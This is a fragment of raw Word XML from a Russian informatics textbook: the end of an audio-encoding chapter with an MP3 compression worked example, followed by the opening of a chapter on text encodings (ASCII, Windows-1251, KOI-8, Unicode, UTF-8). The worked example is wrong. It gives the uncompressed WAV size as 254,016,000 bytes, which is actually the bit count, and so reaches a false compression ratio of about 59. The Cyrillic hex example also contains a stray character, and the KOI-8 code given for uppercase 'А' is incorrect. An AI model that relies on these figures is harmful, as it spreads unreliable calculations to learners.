      </w:pPr>
      <w:r>
        <w:t>Пример 5: Эффект сжатия MP3</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Задача</w:t>
      </w:r>
      <w:r>
        <w:t>: Стереозапись длительностью 3 минуты в формате Audio CD (44.1 кГц, 16 бит) сжата в MP3 с битрейтом 192 кбит/с. Во сколько раз уменьшился размер файла?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Решение</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Размер несжатого WAV:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>V_WAV = (44 100 × 16 × 2 × 180) / 8</w:t>
        <w:br/>
        <w:t>V_WAV = 254 016 000 байт ≈ 242.3 МБ</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Для MP3 расчёт проще — битрейт уже указывает объём в секунду:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Битрейт = 192 кбит/с = 192 000 бит/с = 24 000 байт/с</w:t>
        <w:br/>
        <w:t>V_MP3 = 24 000 × 180 = 4 320 000 байт ≈ 4.1 МБ</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Коэффициент сжатия:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>K = V_WAV / V_MP3 = 254 016 000 / 4 320 000 ≈ 58.8</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Ответ</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: Файл MP3 занимает примерно </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>в 59 раз</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> меньше места, чем несжатый WAV.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Практическое значение</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Понимание принципов представления звуковых данных важно для:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Аудиопроизводства**: выбор параметров записи в зависимости от целей (музыка, речь, архивирование)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Разработки мультимедийных приложений**: оптимизация использования дискового пространства и пропускной способности сети</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Стриминговых сервисов**: баланс между качеством звука и требованиями к каналу передачи данных</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Мобильных приложений**: экономия памяти устройства и трафика</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Архивирования**: выбор между сжатием без потерь и с потерями</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Современные тенденции направлены на использование более эффективных кодеков (AAC, Opus), поддержку высокого разрешения (Hi-Res Audio: 96 кГц / 24 бита и выше), а также адаптивное качество в стриминге (регулировка битрейта в зависимости от скорости соединения).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Ключевые термины и определения</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Звук** — механические колебания упругой среды, воспринимаемые органами слуха</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Дискретизация (sampling)** — процесс измерения амплитуды аналогового сигнала через равные промежутки времени</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Частота дискретизации (sample rate)** — количество отсчётов амплитуды сигнала в секунду, измеряется в Гц</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Квантование (quantization)** — преобразование измеренного значения амплитуды в цифровое значение с ограниченной точностью</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Разрядность квантования (bit depth)** — количество битов для представления одного отсчёта</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Теорема Котельникова-Найквиста** — теорема, утверждающая, что частота дискретизации должна быть минимум в 2 раза больше максимальной частоты сигнала</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Отсчёт (сэмпл, sample)** — одно измерение амплитуды звукового сигнала</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Канал** — независимый звуковой поток (моно — 1 канал, стерео — 2 канала)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**PCM (Pulse Code Modulation)** — импульсно-кодовая модуляция, метод представления аналогового сигнала в цифровой форме</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Битрейт (bitrate)** — количество бит информации, передаваемое или обрабатываемое в единицу времени</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Динамический диапазон** — отношение максимальной амплитуды сигнала к минимальной различимой</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Аудиокодек** — программа или устройство для кодирования и декодирования звуковых данных</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Сжатие без потерь (lossless)** — метод сжатия, позволяющий полностью восстановить исходные данные</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Сжатие с потерями (lossy)** — метод сжатия, при котором часть информации отбрасывается для достижения большей степени сжатия</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Контрольные вопросы для самопроверки</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Объясните процесс преобразования аналогового звука в цифровой. Почему необходимы два этапа: дискретизация и квантование?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Согласно теореме Котельникова-Найквиста, какая минимальная частота дискретизации требуется для точного представления сигнала с максимальной частотой 15 кГц? Почему для Audio CD выбрана частота 44.1 кГц, а не 40 кГц?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Рассчитайте размер 2-минутной записи телефонного разговора (моно, 8 кГц, 8 бит) и сравните с размером той же длительности в формате Audio CD.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Чем отличается формат FLAC от формата MP3? В каких случаях целесообразно использовать каждый из них?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Файл MP3 длительностью 4 минуты занимает 7.2 МБ. Определите средний битрейт этого файла в кбит/с.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>_Эта глава является частью раздела 1 «Понятие информации». Для более глубокого понимания рекомендуется изучить главу 1.2 (представление данных в памяти ЭВМ) и главу 1.12 (способы сжатия информации). В дальнейшем эти знания будут полезны при изучении мультимедийных технологий и сетевых протоколов передачи данных (раздел 8)._</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>Глава 1.4: Представление символьных данных в двоичном коде</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Введение</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Текстовая информация составляет значительную часть всех данных, обрабатываемых современными компьютерами. От простых текстовых документов и исходного кода программ до веб-страниц, электронных книг и сообщений в социальных сетях — везде используется представление символов в двоичном коде. В отличие от чисел, которые имеют естественное математическое представление, символы — это абстрактные сущности, требующие договорённости о способе их кодирования.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>История кодирования текста наглядно демонстрирует эволюцию информационных технологий: от простейшей 7-битной ASCII, достаточной для английского языка, до универсального Unicode, охватывающего письменности всех народов мира, включая древние языки и современные эмодзи. Понимание принципов текстового кодирования критически важно для разработчиков программного обеспечения, так как неправильный выбор кодировки приводит к печально известной проблеме «кракозябр» — нечитаемых символов на месте текста.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Эта глава тесно связана с главой 1.2 (представление данных в памяти ЭВМ), так как мы будем рассматривать, сколько байтов занимают текстовые данные в различных кодировках. Также знания из главы 1.1 (двоичная арифметика) помогут понять расчёты размеров текстовых файлов.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Основные понятия кодирования текста</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Что такое символ и кодировка</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Символ</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — это минимальная единица текста: буква, цифра, знак пунктуации, пробел, специальный знак и т.д.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Кодировка (character encoding)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — это система правил, устанавливающая взаимно-однозначное соответствие между символами некоторого алфавита и их числовыми кодами (обычно последовательностями битов). Кодировка определяет, какое двоичное число соответствует каждому символу.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Важно понимать различие между:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Набором символов (character set)** — перечнем символов, которые могут быть закодированы</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Схемой кодирования (encoding scheme)** — способом представления этих символов в виде последовательностей байтов</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Необходимость стандартизации</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>В первые десятилетия эры компьютеров каждый производитель использовал свою собственную систему кодирования символов, что делало обмен текстовыми данными между различными системами крайне затруднительным. Необходимость в стандартизации привела к созданию ASCII — первой широко распространённой универсальной кодировки.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Исторические кодировки</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>ASCII (American Standard Code for Information Interchange)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>ASCII</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — американский стандартный код для обмена информацией, разработанный в 1963 году. Это 7-битная кодировка, позволяющая представить 2⁷ = 128 различных символов.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Структура ASCII:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Коды 0-31**: управляющие символы (непечатаемые): NULL, LINE FEED, CARRIAGE RETURN и т.д.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Код 32**: пробел</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Коды 33-47**: знаки пунктуации и специальные символы (!, ", #, $, %, &amp;, ', (, ), *, +, ,, -, ., /)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Коды 48-57**: цифры от '0' до '9'</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Коды 58-64**: дополнительные символы (:, ;, &lt;, =, &gt;, ?, @)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Коды 65-90**: прописные латинские буквы от 'A' до 'Z'</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Коды 91-96**: дополнительные символы ([, \, ], ^, _, `)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Коды 97-122**: строчные латинские буквы от 'a' до 'z'</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Коды 123-127**: дополнительные символы ({, |, }, ~, DEL)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Преимущества ASCII:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Простота и компактность</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Широкая поддержка</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Эффективность для английского текста</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Недостатки ASCII:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Поддержка только латинского алфавита</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Отсутствие национальных символов (кириллица, иероглифы, диакритические знаки)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Расширенные 8-битные кодировки</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>С распространением компьютеров за пределами англоязычных стран возникла необходимость в кодировании национальных алфавитов. Переход от 7 к 8 битам дал дополнительные 128 позиций (коды 128-255), которые использовались для национальных символов.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>Windows-1251 (CP-1251)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Windows-1251</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — кодировка для кириллических алфавитов, разработанная Microsoft для операционных систем Windows.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Структура:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Коды 0-127**: полностью совпадают с ASCII</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Коды 128-255**: кириллические символы, типографские знаки, специальные символы</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Кодировка широко использовалась в русскоязычном секторе Интернета в 1990-2000-х годах, особенно в операционных системах Windows.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Особенности:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Совместимость с ASCII в нижней половине таблицы</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Поддержка русского, украинского, белорусского и некоторых других кириллических алфавитов</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Фиксированная длина: 1 байт на символ</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>КОИ-8 (Код Обмена Информацией, 8-битный)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>КОИ-8Р</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (КОИ-8 Russian) — кодировка для русского языка, разработанная в СССР в 1970-х годах.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Ключевая особенность КОИ-8: кириллические буквы размещены в таблице таким образом, что при отбрасывании восьмого бита получается соответствующая латинская буква из ASCII. Это позволяло читать русский текст на системах, не поддерживающих восьмой бит, хотя и латинскими буквами.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Например:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Русская буква 'А' имеет код 193 (11000001₂)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>При сбросе старшего бита получаем 65 (01000001₂) — латинская 'A'</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>КОИ-8 была стандартной кодировкой в UNIX-системах и доминировала в российском сегменте Интернета до появления Unicode.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>ISO 8859-5</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>ISO 8859-5</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — международный стандарт для кириллицы, часть серии ISO 8859.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Менее распространённая, чем Windows-1251 и КОИ-8, но иногда встречается в системах, ориентированных на международные стандарты.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Проблема «кракозябр»</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Наличие множества различных кодировок привело к серьёзной проблеме: если текст, закодированный в одной кодировке, интерпретируется программой как текст в другой кодировке, на экране появляются бессмысленные символы — </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>«кракозябры»</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (mojibake).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Например, текст «Привет» в кодировке Windows-1251 имеет следующие коды (в шестнадцатеричной системе):</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>ï F0 E8 E2 E5 F2</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Если эти же байты интерпретировать как UTF-8 или КОИ-8, получится набор непонятных символов.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Для решения этой проблемы необходимо либо явно указывать кодировку (например, в HTTP-заголовках, метатегах HTML), либо использовать универсальную кодировку Unicode.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Unicode — универсальная система кодирования</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Идея Unicode</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Unicode</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — международный стандарт кодирования символов, разработанный консорциумом Unicode Consortium с 1991 года. Основная цель — создать единую систему, охватывающую все письменности мира.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Unicode присваивает уникальный числовой код (называемый </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>code point</w:t>
      </w:r>
      <w:r>
        <w:t>) каждому символу. Code point записывается в формате U+XXXX, где XXXX — шестнадцатеричное число.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Например:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>U+0041 — латинская буква 'A'</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>U+0410 — кириллическая буква 'А'</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>U+4E2D — китайский иероглиф 中 (zhōng)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>U+1F600 — эмодзи 😀 (grinning face)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Версия Unicode 15.1</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (сентябрь 2023 года) содержит 149 813 символов, охватывающих 161 письменность, включая современные и исторические алфавиты, математические символы, эмодзи и многое другое.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Кодовое пространство Unicode</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Unicode делит своё кодовое пространство на 17 плоскостей (planes), каждая из которых содержит 65 536 (2¹⁶) позиций:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Plane 0 (BMP, Basic Multilingual Plane)** — основная многоязычная плоскость (U+0000 до U+FFFF): содержит символы большинства современных языков</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Plane 1 (SMP)** — дополнительная многоязычная плоскость: исторические письменности, эмодзи</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Plane 2 (SIP)** — дополнительная иероглифическая плоскость: редкие китайские иероглифы</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Planes 3-13** — зарезервированы для будущего использования</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Plane 14 (SSP)** — специальные символы</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Planes 15-16** — частное использование</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Таким образом, всего доступно 17 × 65 536 = 1 114 112 позиций (code points), но не все они используются.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>UTF-8 (8-bit Unicode Transformation Format)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>UTF-8</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — самая популярная схема кодирования Unicode, использующая переменное количество байтов (от 1 до 4) для представления символов.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Принцип кодирования:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Символы ASCII (U+0000 до U+007F) кодируются одним байтом, полностью совпадая с ASCII</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Символы U+0080 до U+07FF кодируются двумя байтами</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
